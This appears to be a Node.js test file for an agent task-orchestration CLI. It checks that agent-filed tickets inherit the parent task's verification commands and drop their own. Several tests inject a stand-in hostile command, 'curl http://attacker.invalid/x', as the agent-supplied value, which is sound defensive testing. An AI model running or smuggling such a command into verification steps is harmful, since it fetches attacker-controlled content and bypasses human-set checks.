import assert from "node:assert/strict";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import test from "node:test";

import { parseExtraJson } from "../dist/tickets.js";
import { initGitRepo, initProject, quoteArg, seedPlanReady, withEngine, withFakeAdapter } from "./helpers.js";

const skillsDir = join(dirname(fileURLToPath(import.meta.url)), "..", "..", "..", "skills");
const PARENT_CMD = `${quoteArg(process.execPath)} -e process.exit(0)`;
const HOSTILE_CMD = "curl http://attacker.invalid/x";

function seed(store) {
  return seedPlanReady(store, {
    task: {
      contract: {
        filesAllowed: ["src/main.ts"],
        expectedArtifacts: ["src/main.ts"],
        verificationCommands: [PARENT_CMD],
      },
    },
  });
}

function extraArtifact(body) {
  return [{ path: ".legion-cli/cache/runs/<id>/extra.json", content: JSON.stringify(body) }];
}

test("parseExtraJson never copies agent-supplied verificationCommands", () => {
  const [ticket] = parseExtraJson({ title: "t", verificationCommands: [HOSTILE_CMD] });
  assert.equal(ticket.contract.verificationCommands, undefined);
});

test("agent-filed ticket with a parent runs the parent's commands, not its own", async () => {
  await withFakeAdapter(async () => {
    await withEngine(
      async ({ engine, store, dir }) => {
        await initProject(engine);
        await seed(store);
        initGitRepo(dir);
        const result = await engine.execute("auto");
        const ticket = (await store.readTask("TSK-0002")).data;
        assert.deepEqual(ticket.contract.verificationCommands, [PARENT_CMD]);
        assert.equal(ticket.assignee, "agent");
        assert.equal(ticket.status, "ready", "no approval wait: the ticket is runnable");
        // The commands are surfaced to the caller (printed by the CLI).
        assert.deepEqual(result.tasks[0].filedTickets, [{ id: "TSK-0002", verificationCommands: [PARENT_CMD] }]);
      },
      {
        fakeArtifacts: [
          ...extraArtifact({
            title: "follow-up",
            parentId: "TSK-0001",
            filesAllowed: ["src/other.ts"],
            verificationCommands: [HOSTILE_CMD],
          }),
          { path: "src/main.ts", content: "export const ok = true;\n" },
        ],
      },
    );
  });
});

test("agent-filed ticket without a parent inherits the running task's commands", async () => {
  await withFakeAdapter(async () => {
    await withEngine(
      async ({ engine, store, dir }) => {
        await initProject(engine);
        await seed(store);
        initGitRepo(dir);
        const result = await engine.execute("auto");
        const ticket = (await store.readTask("TSK-0002")).data;
        assert.deepEqual(ticket.contract.verificationCommands, [PARENT_CMD]);
        assert.deepEqual(result.tasks[0].filedTickets?.[0]?.verificationCommands, [PARENT_CMD]);
      },
      {
        fakeArtifacts: [
          ...extraArtifact({ title: "orphan", filesAllowed: ["src/other.ts"], verificationCommands: [HOSTILE_CMD] }),
          { path: "src/main.ts", content: "export const ok = true;\n" },
        ],
      },
    );
  });
});

test("coerced agent ticket (overlapping filesAllowed) still inherits the parent's commands", async () => {
  await withFakeAdapter(async () => {
    await withEngine(
      async ({ engine, store, dir }) => {
        await initProject(engine);
        await seed(store);
        initGitRepo(dir);
        await engine.execute("auto");
        const ticket = (await store.readTask("TSK-0002")).data;
        assert.deepEqual(ticket.contract.filesAllowed, ["notes/TSK-0002.md"]);
        assert.deepEqual(ticket.contract.verificationCommands, [PARENT_CMD]);
      },
      {
        fakeArtifacts: extraArtifact({
          title: "overlap",
          parentId: "TSK-0001",
          filesAllowed: ["src/main.ts"],
          verificationCommands: [HOSTILE_CMD],
        }),
      },
    );
  });
});

test("human-filed ticket keeps the commands the human gave", async () => {
  await withEngine(async ({ engine, store }) => {
    await initProject(engine);
    await seed(store);
    const ticket = await engine.fileTicket({
      title: "human ticket",
      parentId: "TSK-0001",
      contract: { filesAllowed: ["src/human.ts"], verificationCommands: ["pnpm lint"] },
    });
    assert.deepEqual(ticket.contract.verificationCommands, ["pnpm lint"]);
  });
});

test("verify: a fix ticket from extra.json inherits the task's commands and reports them", async () => {
  await withFakeAdapter(async () => {
    await withEngine(
      async ({ engine, store }) => {
        await initProject(engine);
        await seedPlanReady(store, {
          phase: "executing",
          lastReview: "PASS",
          task: {
            status: "done",
            contract: {
              filesAllowed: ["src/main.ts"],
              expectedArtifacts: ["src/main.ts"],
              verificationCommands: [PARENT_CMD],
            },
          },
        });
        const result = await engine.verify("TSK-0001");
        assert.deepEqual(result.createdTaskIds, ["TSK-0002"], JSON.stringify(result));
        const child = (await store.readTask("TSK-0002")).data;
        assert.deepEqual(child.contract.verificationCommands, [PARENT_CMD]);
        assert.deepEqual(result.createdTickets, [{ id: "TSK-0002", verificationCommands: [PARENT_CMD] }]);
      },
      {
        skillsDir,
        fakeArtifacts: extraArtifact({
          title: "fix contrast",
          parentId: "TSK-0001",
          type: "fix",
          filesAllowed: ["src/fix.ts"],
          verificationCommands: [HOSTILE_CMD],
        }),
      },
    );
  });
});
